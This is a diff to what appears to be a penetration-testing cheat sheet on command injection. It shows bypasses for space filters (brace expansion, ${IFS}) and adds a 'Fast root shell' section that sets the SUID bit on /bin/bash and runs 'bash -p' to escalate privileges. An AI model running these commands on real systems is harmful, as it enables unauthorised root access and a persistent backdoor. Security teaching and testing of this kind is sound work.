@@ -51,8 +51,15 @@ If you are restricted of using spaces in your command inputs you might be able t
 ```bash
 # 1. bash curly brace expansion
 {echo,test} == echo test
-
 # 2. IFS Variable
 echo${IFS}test == echo test
+```
+
+## Fast root shell
+If you only have restricted command injection as root you can try to change the permissions of /bin/bash to have the suid bit set, if you are already on the system
+with another user.
+```bash
+chmod u+s /bin/bash
+/bin/bash -p # as the other user
 ```
 
